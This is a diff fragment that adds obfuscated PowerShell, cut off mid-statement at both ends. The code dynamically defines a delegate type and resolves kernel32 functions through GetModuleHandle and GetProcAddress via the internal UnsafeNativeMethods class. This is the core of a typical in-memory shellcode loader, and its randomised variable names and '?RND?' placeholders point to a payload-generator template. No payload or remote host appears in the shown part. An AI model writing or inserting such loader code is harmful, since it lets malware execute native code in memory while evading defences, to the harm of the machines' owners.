@@ -1,0 +1,24 @@
+
+$vy9 =
+[AppDomain]::CurrentDomain.
+DefineDynamicAssembly((New-Object System.
+Reflection.
+AssemblyName('?RND?')),
+[System.
+Reflection.
+Emit.
+AssemblyBuilderAccess]::Run).DefineDynamicModule('?RND?', $false).DefineType('?RND?', 'Class,Public,Sealed,AnsiClass,AutoClass', [System.
+MulticastDelegate]); $vy9.DefineConstructor('RTSpecialName,HideBySig,Public', [System.
+Reflection.
+CallingConventions]::Standard, $fn7).SetImplementationFlags('Runtime,Managed'); $vy9.DefineMethod('Invoke', 'Public,HideBySig,NewSlot,Virtual', $xf7, $fn7).SetImplementationFlags('Runtime,Managed'); $vy9.CreateType() } function GetProcAddress { param($fn7) $fq3 = ([AppDomain]::CurrentDomain.
+GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -and $_.Location.
+Split('\\\\')[-1].Equals('System.dll') }).GetType('Microsoft.
+Win32.UnsafeNativeMethods'); $lr3 = New-Object System.
+Runtime.
+InteropServices.
+HandleRef((New-Object IntPtr), ($fq3.GetMethod('GetModuleHandle').Invoke(0, @('kernel32.dll')))); $fq3.GetMethod('GetProcAddress', [reflection.bindingflags] 'Public,Static', $null, [System.
+Reflection.
+CallingConventions]::Any, @((New-Object System.
+Runtime.
+InteropServices.
+HandleRef).GetType(), [string]), $null).Invoke($null, @([System.
